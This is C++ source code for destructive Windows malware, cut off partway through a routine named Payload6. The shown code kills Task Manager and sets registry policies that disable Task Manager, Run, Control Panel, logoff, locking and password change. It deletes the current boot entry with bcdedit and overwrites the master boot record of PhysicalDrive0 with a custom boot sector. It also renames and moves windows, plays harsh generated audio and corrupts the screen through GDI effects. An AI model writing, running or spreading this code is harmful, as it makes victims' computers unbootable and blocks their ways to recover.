﻿#include <windows.h>
#include <mmsystem.h>
#include <wingdi.h>
#include <winuser.h>
#include <winbase.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <vector>
#include <algorithm>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
typedef LONG(NTAPI* NRHEdef)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef LONG(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* RSPICdef)(BOOLEAN NewValue, PBOOLEAN OldValue, BOOLEAN IsWinlogon);
DWORD WINAPI Disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    return 1;
}
const unsigned char mbr[512] = {
    0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBA, 0xC8, 0x03, 0x31, 0xC0, 0xEE,
    0x42, 0x31, 0xC9, 0x88, 0xC8, 0xE8, 0x17, 0x00, 0xEE, 0x88, 0xC8, 0x04, 0x55, 0xE8, 0x0F, 0x00,
    0xEE, 0x88, 0xC8, 0x04, 0xAA, 0xE8, 0x07, 0x00, 0xEE, 0xFE, 0xC1, 0x75, 0xE6, 0xEB, 0x09, 0x3C,
    0x80, 0x72, 0x02, 0xF6, 0xD0, 0xD0, 0xE8, 0xC3, 0x31, 0xED, 0x31, 0xFF, 0xBA, 0xC8, 0x00, 0xB9,
    0x40, 0x01, 0x89, 0xC8, 0x01, 0xD0, 0x01, 0xE8, 0xC1, 0xE8, 0x01, 0xAA, 0xE2, 0xF4, 0x4A, 0x75,
    0xEE, 0x45, 0xEB, 0xE6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    HANDLE hDrive = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_WRITE_THROUGH,
        NULL
    );

    if (hDrive == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    DWORD bytesReturned = 0;

    SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);

    DWORD bytesWritten = 0;
    BOOL success = WriteFile(
        hDrive,
        mbr,
        sizeof(mbr),
        &bytesWritten,
        NULL
    );

    DWORD result = (success && bytesWritten == sizeof(mbr)) ? 0 : GetLastError();

    return 0;
}
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) {
        SetWindowTextA(hwnd, "r92er829u.exe");
    }
    return TRUE;
}

DWORD WINAPI WindowMove(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        HWND hwnd = GetForegroundWindow();
        if (hwnd) {
            RECT rect;
            if (GetWindowRect(hwnd, &rect)) {
                int winW = rect.right - rect.left;
                int winH = rect.bottom - rect.top;
                int maxX = (w > winW) ? (w - winW) : 1;
                int maxY = (h > winH) ? (h - winH) : 1;
                int newX = rand() % maxX;
                int newY = rand() % maxY;
                SetWindowPos(hwnd, NULL, newX, newY, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
            }
        }
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI WindowTitles(LPVOID lpParam) {
    while (true) {
        EnumWindows(EnumWindowsProc, 0);
        Sleep(300);
    }
    return 0;
}

DWORD WINAPI Sound1(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    const DWORD duration = 30;
    const DWORD bufferSize = wfx.nSamplesPerSec * duration;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);

    if (!buffer) {
        waveOutClose(hWaveOut);
        return 1;
    }

    for (DWORD t = 0; t < bufferSize; ++t) {
        buffer[t] = (char)((0x45) * (t >> 3 | t >> 9) * t & t >> 8);
    }

    WAVEHDR header = { 0 };
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);

    HeapFree(GetProcessHeap(), 0, buffer);
    return 0;
}
DWORD WINAPI Sound2(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    const DWORD duration = 30;
    const DWORD bufferSize = wfx.nSamplesPerSec * duration;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);

    if (!buffer) {
        waveOutClose(hWaveOut);
        return 1;
    }

    for (DWORD t = 0; t < bufferSize; ++t) {
        buffer[t] = (char)((10 * (t >> 6 | t | t >> (t >> 16)) + (7 & t >> 11)));
    }

    WAVEHDR header = { 0 };
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);

    HeapFree(GetProcessHeap(), 0, buffer);
    return 0;
}
DWORD WINAPI Sound3(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 11025;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    const DWORD duration = 30;
    const DWORD bufferSize = wfx.nSamplesPerSec * duration;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);

    if (!buffer) {
        waveOutClose(hWaveOut);
        return 1;
    }

    for (DWORD t = 0; t < bufferSize; ++t) {
        buffer[t] = (char)((0xF9F5) + (t >> 1 & t >> 7));
    }

    WAVEHDR header = { 0 };
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);

    HeapFree(GetProcessHeap(), 0, buffer);
    return 0;
}
DWORD WINAPI Sound4(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 22050;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    const DWORD duration = 30;
    const DWORD bufferSize = wfx.nSamplesPerSec * duration;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);

    if (!buffer) {
        waveOutClose(hWaveOut);
        return 1;
    }

    for (DWORD t = 0; t < bufferSize; ++t) {
        buffer[t] = (char)(((t >> 3) | (t >> 4) | (t * t)) & (((t & 0x4000 ? 6 : 5) * t * ((t >> (t & 0x800 ? 14 : 14) & 3) + 3)) >> ((t >> 8 & 3) + 1)) | ((((t >> 11 & 3) + 1) * (((t >> 4) | ((t & 0x4000 ? 6 : 5) * t >> 2)) << 24 >> 24)) >> (t >> 9 & 3)) * t & t >> 8);
    }

    WAVEHDR header = { 0 };
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);

    HeapFree(GetProcessHeap(), 0, buffer);
    return 0;
}
DWORD WINAPI Sound5(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 22050;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    const DWORD duration = 30;
    const DWORD bufferSize = wfx.nSamplesPerSec * duration;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);

    if (!buffer) {
        waveOutClose(hWaveOut);
        return 1;
    }

    for (DWORD t = 0; t < bufferSize; ++t) {
        buffer[t] = (char)((0x45) * (t >> 3 | t >> 9));
    }

    WAVEHDR header = { 0 };
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);

    HeapFree(GetProcessHeap(), 0, buffer);
    return 0;
}
DWORD WINAPI Sound6(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    const DWORD duration = 30;
    const DWORD bufferSize = wfx.nSamplesPerSec * duration;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);

    if (!buffer) {
        waveOutClose(hWaveOut);
        return 1;
    }

    for (DWORD t = 0; t < bufferSize; ++t) {
        buffer[t] = (char)(((t * ((-895956328 >> (int)((t >> 9) & 0x0E)) & 0xF)) | (t >> 2)));
    }

    WAVEHDR header = { 0 };
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);

    HeapFree(GetProcessHeap(), 0, buffer);
    return 0;
}
DWORD WINAPI Sound7(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 11025;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    const DWORD duration = 30;
    const DWORD bufferSize = wfx.nSamplesPerSec * duration;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);

    if (!buffer) {
        waveOutClose(hWaveOut);
        return 1;
    }

    for (DWORD t = 0; t < bufferSize; ++t) {
        buffer[t] = (char)((t * ((t * t) ^ (t >> 10))));
    }

    WAVEHDR header = { 0 };
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);

    HeapFree(GetProcessHeap(), 0, buffer);
    return 0;
}
DWORD WINAPI Sound8(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    const DWORD duration = 30;
    const DWORD bufferSize = wfx.nSamplesPerSec * duration;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);

    if (!buffer) {
        waveOutClose(hWaveOut);
        return 1;
    }

    for (DWORD t = 0; t < bufferSize; ++t) {
        buffer[t] = (char)((t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) ^ (1 & t >> 14)) >> (3 & -(int)t >> (t & 2048 ? 2 : 10))));
    }

    WAVEHDR header = { 0 };
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);

    HeapFree(GetProcessHeap(), 0, buffer);
    return 0;
}
DWORD WINAPI Payload1(LPVOID lpParam) {
    DWORD lastFlash = GetTickCount();
    while (true) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h_dim = GetSystemMetrics(SM_CYSCREEN);

        if (GetTickCount() - lastFlash >= 500) {
            HBRUSH flashBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
            HGDIOBJ oldFlash = SelectObject(hdc, flashBrush);
            PatBlt(hdc, 0, 0, w, h_dim, PATINVERT);
            SelectObject(hdc, oldFlash);
            DeleteObject(flashBrush);
            lastFlash = GetTickCount();
        }

        BitBlt(hdc, (rand() % 11) - 5, (rand() % 11) - 5, w, h_dim, hdc, 0, 0, SRCPAINT);

        HBRUSH h = CreateSolidBrush((rand() % 0xff) << 16 | (rand() % 0xff) << 8 | (rand() % 0xff));
        HGDIOBJ oldH = SelectObject(hdc, h);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h_dim, hdc, rand() % 2, rand() % 2, 0xac010e);
        SelectObject(hdc, oldH);
        DeleteObject(h);

        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Payload2(LPVOID lpParam) {
    int wSrc = GetSystemMetrics(SM_CXSCREEN);
    int hDest = GetSystemMetrics(SM_CYSCREEN);
    int t = 0;

    while (true) {
        HDC hdc = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, wSrc, hDest);
        HGDIOBJ oldBm = SelectObject(hdcMem, hbm);

        double fVar1 = sin((double)t * 0.05);
        StretchBlt(hdc, -(int)(20.0 * fVar1) / 2, 0, wSrc + (int)(20.0 * fVar1), hDest, hdc, 0, 0, wSrc, hDest, 0xcc0020);

        BitBlt(hdcMem, 0, 0, wSrc, hDest, hdc, 0, 0, SRCCOPY);

        double angle = sin((double)t * 0.12) * 0.18;
        double cosA = cos(angle);
        double sinA = sin(angle);
        int cx = wSrc / 2;
        int cy = hDest / 2;

        POINT pts[3];
        pts[0].x = (LONG)(cx + (-cx * cosA - (-cy) * sinA));
        pts[0].y = (LONG)(cy + (-cx * sinA + (-cy) * cosA));
        pts[1].x = (LONG)(cx + ((wSrc - cx) * cosA - (-cy) * sinA));
        pts[1].y = (LONG)(cy + ((wSrc - cx) * sinA + (-cy) * cosA));
        pts[2].x = (LONG)(cx + (-cx * cosA - (hDest - cy) * sinA));
        pts[2].y = (LONG)(cy + (-cx * sinA + (hDest - cy) * cosA));

        PlgBlt(hdc, pts, hdcMem, 0, 0, wSrc, hDest, NULL, 0, 0);

        SelectObject(hdcMem, oldBm);
        DeleteObject(hbm);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdc);

        t++;
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Payload3(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        HDC hdc = GetDC(NULL);

        HBRUSH colorBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        HGDIOBJ oldColor = SelectObject(hdc, colorBrush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        SelectObject(hdc, oldColor);
        DeleteObject(colorBrush);

        HBRUSH brush = CreateHatchBrush(rand() % 6, RGB(rand() % 256, rand() % 256, rand() % 256));
        HGDIOBJ oldBrush = SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 30, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -h + 30, 0x1900ac010e);
        SelectObject(hdc, oldBrush);
        DeleteObject(brush);

        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Payload4(LPVOID lpParam) {
    HDC hdcInit = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcInit);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;

    DWORD* rgbScreen = NULL;
    HBITMAP hbmTemp = CreateDIBSection(hdcInit, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    HGDIOBJ oldBm = SelectObject(hdcMem, hbmTemp);
    ReleaseDC(NULL, hdcInit);

    double radius = 37.4;
    double angle = 0.0;
    const double pi = 3.14159265358979323846;
    DWORD frame = 0;

    while (true) {
        HDC hdcScreen = GetDC(NULL);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

        DWORD colorShift = ((frame * 17) & 0xFF) << 16 | ((frame * 31) & 0xFF) << 8 | ((frame * 47) & 0xFF);
        int idx = 0;
        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                rgbScreen[idx] ^= ((x ^ y) << 2) ^ colorShift;
                ++idx;
            }
        }

        int sx = (int)(cos(angle) * radius);
        int sy = (int)(sin(angle) * radius);
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, sx, sy, SRCCOPY);

        ReleaseDC(NULL, hdcScreen);
        angle = fmod(angle + (4.0 * pi) / radius, 2.0 * pi);
        frame += 4;
    }

    SelectObject(hdcMem, oldBm);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
    return 0;
}
DWORD WINAPI Payload5(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    DWORD tick = 0;

    while (true) {
        HDC hdc = GetDC(NULL);

        HBRUSH colorBrush = CreateSolidBrush(RGB((tick * 13) % 256, (tick * 29) % 256, (tick * 43) % 256));
        HGDIOBJ oldBrush = SelectObject(hdc, colorBrush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        SelectObject(hdc, oldBrush);
        DeleteObject(colorBrush);

        int shift = 12;
        BitBlt(hdc, shift, 0, w - shift, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, shift, h, hdc, w - shift, 0, SRCCOPY);

        ReleaseDC(NULL, hdc);
        tick++;
        Sleep(15);
    }
    return 0;
}

DWORD WINAPI Ball(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    int radius = 65;
    int x = w / 3;
    int y = h / 3;
    int vx = 8;
    int vy = 6;

    const COLORREF palette[] = {
        RGB(255, 0, 128),
        RGB(0, 255, 190),
        RGB(180, 255, 0),
        RGB(90, 0, 255),
        RGB(255, 140, 0),
        RGB(0, 160, 255),
        RGB(255, 40, 90),
        RGB(40, 255, 110)
    };
    const int paletteSize = sizeof(palette) / sizeof(palette[0]);
    int colorIdx = 0;
    int step = 0;

    while (true) {
        HDC hdc = GetDC(NULL);

        x += vx;
        y += vy;

        if (x - radius <= 0) {
            x = radius;
            vx = -vx;
            colorIdx = (colorIdx + 3) % paletteSize;
        }
        else if (x + radius >= w) {
            x = w - radius;
            vx = -vx;
            colorIdx = (colorIdx + 3) % paletteSize;
        }

        if (y - radius <= 0) {
            y = radius;
            vy = -vy;
            colorIdx = (colorIdx + 5) % paletteSize;
        }
        else if (y + radius >= h) {
            y = h - radius;
            vy = -vy;
            colorIdx = (colorIdx + 5) % paletteSize;
        }

        if (step % 7 == 0) {
            colorIdx = (colorIdx + 1) % paletteSize;
        }

        HBRUSH ballBrush = CreateSolidBrush(palette[colorIdx]);
        HPEN ballPen = CreatePen(PS_SOLID, 3, palette[(colorIdx + 4) % paletteSize]);
        HGDIOBJ oldBrush = SelectObject(hdc, ballBrush);
        HGDIOBJ oldPen = SelectObject(hdc, ballPen);

        Ellipse(hdc, x - radius, y - radius, x + radius, y + radius);

        SelectObject(hdc, oldPen);
        SelectObject(hdc, oldBrush);
        DeleteObject(ballPen);
        DeleteObject(ballBrush);
        ReleaseDC(NULL, hdc);

        step++;
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Payload6(LPVOID lpParam) {
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

